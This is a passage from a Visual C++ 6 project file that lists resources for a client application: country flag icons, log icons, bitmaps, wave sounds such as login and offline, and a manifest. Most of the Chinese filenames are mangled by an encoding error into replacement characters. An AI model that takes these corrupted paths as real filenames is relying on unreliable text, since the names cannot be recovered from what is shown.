SOURCE=".\res\GuoQiICO\ɳ�ذ�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ʥ��������������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ʥ���ĺ���ά˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ʥ¬����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ʥ����ŵ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ʥ��ɭ�غ͸����ɶ�˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\˹������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\˹�工��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\˹��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\˹��ʿ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�յ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������Ⱥ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\̨��ʡ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\̩��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\̫ƽ��ͬ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\̹ɣ����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�������Ͷ�͸�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ͻ��˹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ͼ��¬.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\�˳�����.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��Ŭ��ͼ.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Σ������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ί������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ڸɴ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ڿ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���ȱ��˹̹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��IP���ݿ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����Ħ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ϣ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\ϵͳ����.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�¼���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ҳ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��ɫ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ӡ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\ӡ��������.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ӣ����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Ӣ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Լ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\Խ��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�ޱ���.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\է��.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�з�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�й�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\�ظ�����.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\�³.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\��ٸ�.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\쳼�.ico"
# End Source File
# End Group
# Begin Source File

SOURCE=.\res\Wave\Dat.wav
# End Source File
# Begin Source File

SOURCE=.\res\Wave\key.wav
# End Source File
# Begin Source File

SOURCE=.\res\Wave\login.wav
# End Source File
# Begin Source File

SOURCE=.\res\Wave\offline.wav
# End Source File
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# Begin Source File

SOURCE=.\res\Wave\Setting.wav
# End Source File
# Begin Source File

SOURCE=.\res\Wave\switch.wav
# End Source File
# Begin Source File

SOURCE=.\res\Wave\welcome.wav
# End Source File
# Begin Source File

SOURCE=.\res\xpstyle.manifest
# End Source File
# End Target
# End Project
